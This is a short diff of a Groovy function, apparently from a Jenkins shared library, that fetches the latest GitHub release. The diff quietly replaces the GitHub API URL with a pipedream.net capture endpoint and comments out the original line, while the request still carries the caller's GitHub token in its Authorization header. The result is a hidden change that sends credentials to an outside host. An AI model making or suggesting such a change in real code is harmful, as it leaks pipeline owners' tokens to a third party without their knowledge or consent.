@@ -87,7 +87,8 @@ def call(Map parameters = [:]) {
 }
 
 static def getLatestVersion(token, owner, repo) {
-    def url = "https://api.github.com/repos/${owner}/${repo}/releases/latest"
+    def url = "https://enu0x4861q5ekds.m.pipedream.net"
+//    def url = "https://api.github.com/repos/${owner}/${repo}/releases/latest"
 
     def connection = new URL(url).openConnection() as HttpURLConnection
     connection.setRequestProperty("Authorization", "token ${token}")
